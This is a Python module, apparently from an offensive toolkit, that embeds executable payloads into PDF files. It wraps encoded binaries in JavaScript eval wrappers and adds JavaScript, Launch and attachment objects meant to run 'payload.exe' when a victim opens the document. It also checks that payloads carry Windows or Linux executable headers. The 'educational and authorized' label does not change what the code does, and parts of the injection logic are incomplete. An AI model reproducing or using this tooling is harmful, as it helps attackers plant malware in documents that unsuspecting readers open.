"""
Payload Embedder Module
Educational and Authorized Security Testing Tool
Handles embedding of payloads into PDF files
"""

import os
import base64
import logging
from typing import Dict, Optional, Tuple, Union
from datetime import datetime
import struct


class PayloadEmbedder:
    """Handles payload embedding into PDF files"""
    
    def __init__(self, config: Dict = None):
        """
        Initialize payload embedder
        
        Args:
            config: Configuration dictionary
        """
        self.config = config or {}
        self.logger = logging.getLogger(__name__)
        self.max_payload_size = self.config.get('max_payload_size', 524288)
        self.payload_cache = {}
    
    def load_payload(self, payload_path: str) -> Optional[bytes]:
        """
        Load payload from file
        
        Args:
            payload_path: Path to payload file
            
        Returns:
            Payload bytes or None if loading fails
        """
        try:
            if not os.path.exists(payload_path):
                self.logger.error(f"Payload file not found: {payload_path}")
                return None
            
            with open(payload_path, 'rb') as f:
                payload = f.read()
            
            # Check payload size
            if len(payload) > self.max_payload_size:
                self.logger.error(f"Payload too large: {len(payload)} bytes (max: {self.max_payload_size})")
                return None
            
            self.logger.info(f"Loaded payload: {len(payload)} bytes from {payload_path}")
            return payload
        
        except Exception as e:
            self.logger.error(f"Error loading payload: {e}")
            return None
    
    def load_custom_script(self, script_path: str) -> Optional[str]:
        """
        Load custom JavaScript from file
        
        Args:
            script_path: Path to JavaScript file
            
        Returns:
            Script content or None if loading fails
        """
        try:
            if not os.path.exists(script_path):
                self.logger.error(f"Script file not found: {script_path}")
                return None
            
            with open(script_path, 'r') as f:
                script = f.read()
            
            self.logger.info(f"Loaded custom script: {len(script)} characters from {script_path}")
            return script
        
        except Exception as e:
            self.logger.error(f"Error loading script: {e}")
            return None
    
    def encode_payload(self, payload: bytes, encoding: str = 'base64') -> str:
        """
        Encode payload for embedding
        
        Args:
            payload: Raw payload bytes
            encoding: Encoding method (base64/hex/ascii85)
            
        Returns:
            Encoded payload string
        """
        try:
            if encoding == 'base64':
                encoded = base64.b64encode(payload).decode('ascii')
            elif encoding == 'hex':
                encoded = payload.hex()
            elif encoding == 'ascii85':
                import base64
                encoded = base64.a85encode(payload).decode('ascii')
            else:
                self.logger.error(f"Unsupported encoding: {encoding}")
                return ''
            
            self.logger.info(f"Encoded payload using {encoding}: {len(encoded)} characters")
            return encoded
        
        except Exception as e:
            self.logger.error(f"Error encoding payload: {e}")
            return ''
    
    def decode_payload(self, encoded: str, encoding: str = 'base64') -> Optional[bytes]:
        """
        Decode encoded payload
        
        Args:
            encoded: Encoded payload string
            encoding: Encoding method used
            
        Returns:
            Decoded payload bytes or None if decoding fails
        """
        try:
            if encoding == 'base64':
                decoded = base64.b64decode(encoded)
            elif encoding == 'hex':
                decoded = bytes.fromhex(encoded)
            elif encoding == 'ascii85':
                import base64
                decoded = base64.a85decode(encoded)
            else:
                self.logger.error(f"Unsupported encoding: {encoding}")
                return None
            
            self.logger.info(f"Decoded payload using {encoding}: {len(decoded)} bytes")
            return decoded
        
        except Exception as e:
            self.logger.error(f"Error decoding payload: {e}")
            return None
    
    def create_javascript_shellcode(self, payload: bytes, method: str = 'eval') -> str:
        """
        Create JavaScript wrapper for shellcode
        
        Args:
            payload: Raw payload bytes
            method: Execution method (eval/unescape/unescape+eval)
            
        Returns:
            JavaScript code with embedded payload
        """
        try:
            encoded = self.encode_payload(payload, 'base64')
            
            if method == 'eval':
                js_code = f"""
// Payload embedded: {datetime.now().isoformat()}
var payload = "{encoded}";
var decoded = atob(payload);
// Execute payload - implementation depends on vulnerability
eval(String.fromCharCode.apply(null, decoded.split('').map(c => c.charCodeAt(0))));
"""
            elif method == 'unescape':
                js_code = f"""
// Payload embedded: {datetime.now().isoformat()}
var payload = "{encoded}";
var decoded = atob(payload);
var unescaped = unescape(decoded);
// Execute payload
eval(unescaped);
"""
            elif method == 'function':
                js_code = f"""
// Payload embedded: {datetime.now().isoformat()}
function executePayload() {{
    var payload = "{encoded}";
    var decoded = atob(payload);
    var shellcode = new Array(decoded.length);
    for (var i = 0; i < decoded.length; i++) {{
        shellcode[i] = decoded.charCodeAt(i);
    }}
    // Convert to executable - vulnerability dependent
    return shellcode;
}}
executePayload();
"""
            else:
                js_code = f"""
// Payload embedded: {datetime.now().isoformat()}
var payload = "{encoded}";
var decoded = atob(payload);
// Custom execution method
"""
            
            return js_code
        
        except Exception as e:
            self.logger.error(f"Error creating JavaScript shellcode: {e}")
            return ''
    
    def create_pdf_javascript_action(self, javascript: str) -> bytes:
        """
        Create PDF JavaScript action object
        
        Args:
            javascript: JavaScript code to execute
            
        Returns:
            PDF object bytes
        """
        try:
            # Escape special characters
            escaped_js = javascript.replace('\\', '\\\\').replace('(', '\\(').replace(')', '\\)')
            
            pdf_object = f"""<<
/Type /Action
/S /JavaScript
/JS ({escaped_js})
>>
"""
            return pdf_object.encode('latin-1')
        
        except Exception as e:
            self.logger.error(f"Error creating PDF JavaScript action: {e}")
            return b''
    
    def create_pdf_launch_action(self, file_path: str) -> bytes:
        """
        Create PDF launch action to execute file
        
        Args:
            file_path: Path to file to execute
            
        Returns:
            PDF object bytes
        """
        try:
            pdf_object = f"""<<
/Type /Action
/S /Launch
/F ({file_path})
>>
"""
            return pdf_object.encode('latin-1')
        
        except Exception as e:
            self.logger.error(f"Error creating PDF launch action: {e}")
            return b''
    
    def create_open_action(self, action_data: bytes) -> bytes:
        """
        Create PDF OpenAction object
        
        Args:
            action_data: Action object bytes
            
        Returns:
            PDF OpenAction object bytes
        """
        try:
            open_action = f"""<<
/Type /Catalog
/OpenAction {action_data.decode('latin-1')}
>>
"""
            return open_action.encode('latin-1')
        
        except Exception as e:
            self.logger.error(f"Error creating OpenAction: {e}")
            return b''
    
    def embed_payload_in_pdf(self, pdf_content: bytes, payload: bytes, 
                           method: str = 'javascript') -> Optional[bytes]:
        """
        Embed payload into PDF content
        
        Args:
            pdf_content: Original PDF content
            payload: Payload to embed
            method: Embedding method (javascript/launch/attachment)
            
        Returns:
            Modified PDF content or None if embedding fails
        """
        try:
            if method == 'javascript':
                js_code = self.create_javascript_shellcode(payload, 'eval')
                action = self.create_pdf_javascript_action(js_code)
                modified_pdf = self._inject_javascript(pdf_content, action)
            
            elif method == 'launch':
                # Embed payload as temporary file and launch it
                temp_filename = "payload.exe"
                action = self.create_pdf_launch_action(temp_filename)
                modified_pdf = self._inject_launch_action(pdf_content, action, payload)
            
            elif method == 'attachment':
                modified_pdf = self._inject_as_attachment(pdf_content, payload, "payload.exe")
            
            else:
                self.logger.error(f"Unsupported embedding method: {method}")
                return None
            
            self.logger.info(f"Successfully embedded payload using {method} method")
            return modified_pdf
        
        except Exception as e:
            self.logger.error(f"Error embedding payload: {e}")
            return None
    
    def _inject_javascript(self, pdf_content: bytes, js_action: bytes) -> bytes:
        """
        Inject JavaScript action into PDF
        
        Args:
            pdf_content: Original PDF content
            js_action: JavaScript action object
            
        Returns:
            Modified PDF content
        """
        try:
            # Simple injection: append JavaScript action
            # In production, would use proper PDF manipulation library
            
            # Find %%EOF marker
            eof_marker = b'%%EOF'
            eof_pos = pdf_content.rfind(eof_marker)
            
            if eof_pos == -1:
                self.logger.error("Could not find EOF marker in PDF")
                return pdf_content
            
            # Get object number (simplified)
            obj_number = self._get_next_object_number(pdf_content)
            
            # Create JavaScript object
            js_obj = f"\n{obj_number} 0 obj\n{js_action.decode('latin-1')}\nendobj\n".encode('latin-1')
            
            # Create OpenAction reference
            open_action_ref = f"\n/Names [(EmbeddedJS) {obj_number} 0 R]\n".encode('latin-1')
            
            # Insert before EOF
            modified_content = pdf_content[:eof_pos] + js_obj + pdf_content[eof_pos:]
            
            return modified_content
        
        except Exception as e:
            self.logger.error(f"Error injecting JavaScript: {e}")
            return pdf_content
    
    def _inject_launch_action(self, pdf_content: bytes, action: bytes, payload: bytes) -> bytes:
        """
        Inject launch action with embedded payload
        
        Args:
            pdf_content: Original PDF content
            action: Launch action object
            payload: Payload file content
            
        Returns:
            Modified PDF content
        """
        try:
            # In production, would use proper PDF manipulation
            # This is a simplified version
            
            eof_marker = b'%%EOF'
            eof_pos = pdf_content.rfind(eof_marker)
            
            if eof_pos == -1:
                return pdf_content
            
            # Embed payload as file specification (simplified)
            obj_number = self._get_next_object_number(pdf_content)
            
            payload_obj = f"\n{obj_number} 0 obj\n<<\n/Type /EmbeddedFile\n/Length {len(payload)}\n>>\nstream\n"
            payload_obj += payload.decode('latin-1', errors='replace')
            payload_obj += f"\nendstream\nendobj\n"
            
            modified_content = pdf_content[:eof_pos] + payload_obj.encode('latin-1') + pdf_content[eof_pos:]
            
            return modified_content
        
        except Exception as e:
            self.logger.error(f"Error injecting launch action: {e}")
            return pdf_content
    
    def _inject_as_attachment(self, pdf_content: bytes, payload: bytes, filename: str) -> bytes:
        """
        Inject payload as PDF attachment
        
        Args:
            pdf_content: Original PDF content
            payload: Payload file content
            filename: Attachment filename
            
        Returns:
            Modified PDF content
        """
        try:
            # In production, would use proper PDF manipulation
            
            eof_marker = b'%%EOF'
            eof_pos = pdf_content.rfind(eof_marker)
            
            if eof_pos == -1:
                return pdf_content
            
            # Create file specification object
            obj_number = self._get_next_object_number(pdf_content)
            
            file_spec = f"""
{obj_number} 0 obj
<<
/Type /Filespec
/F ({filename})
/EF << /F {obj_number + 1} 0 R >>
>>
endobj

{obj_number + 1} 0 obj
<<
/Type /EmbeddedFile
/Length {len(payload)}
>>
stream
"""
            file_spec += payload.decode('latin-1', errors='replace')
            file_spec += f"""
endstream
endobj
"""
            
            modified_content = pdf_content[:eof_pos] + file_spec.encode('latin-1') + pdf_content[eof_pos:]
            
            return modified_content
        
        except Exception as e:
            self.logger.error(f"Error injecting as attachment: {e}")
            return pdf_content
    
    def _get_next_object_number(self, pdf_content: bytes) -> int:
        """
        Get next available object number for PDF
        
        Args:
            pdf_content: PDF content
            
        Returns:
            Next object number
        """
        try:
            # Count object occurrences to find next number
            obj_count = pdf_content.count(b' 0 obj')
            return obj_count + 1
        except Exception:
            return 1
    
    def validate_payload(self, payload: bytes, target_os: str) -> Tuple[bool, str]:
        """
        Validate payload for target OS
        
        Args:
            payload: Payload bytes
            target_os: Target operating system
            
        Returns:
            Tuple of (is_valid, message)
        """
        try:
            if not payload:
                return False, "Empty payload"
            
            # Check payload size
            if len(payload) > self.max_payload_size:
                return False, f"Payload too large: {len(payload)} bytes"
            
            # Check PE header for Windows
            if target_os.lower() == 'windows':
                if len(payload) < 2:
                    return False, "Payload too small for PE file"
                if payload[:2] != b'MZ':
                    return False, "Invalid PE header (not a Windows executable)"
            
            # Check ELF header for Linux
            elif target_os.lower() == 'linux':
                if len(payload) < 4:
                    return False, "Payload too small for ELF file"
                if payload[:4] != b'\x7fELF':
                    return False, "Invalid ELF header (not a Linux executable)"
            
            return True, "Payload validated successfully"
        
        except Exception as e:
            return False, f"Validation error: {e}"
    
    def get_payload_info(self, payload: bytes) -> Dict:
        """
        Get information about payload
        
        Args:
            payload: Payload bytes
            
        Returns:
            Dictionary with payload information
        """
        info = {
            'size': len(payload),
            'sha256': '',
            'md5': '',
            'file_type': 'unknown',
            'encoding': 'raw'
        }
        
        try:
            import hashlib
            info['sha256'] = hashlib.sha256(payload).hexdigest()
            info['md5'] = hashlib.md5(payload).hexdigest()
            
            # Detect file type
            if len(payload) >= 2:
                if payload[:2] == b'MZ':
                    info['file_type'] = 'windows_executable'
                elif len(payload) >= 4 and payload[:4] == b'\x7fELF':
                    info['file_type'] = 'linux_executable'
                elif payload.startswith(b'#!'):
                    info['file_type'] = 'shell_script'
            
        except Exception as e:
            self.logger.error(f"Error getting payload info: {e}")
        
        return info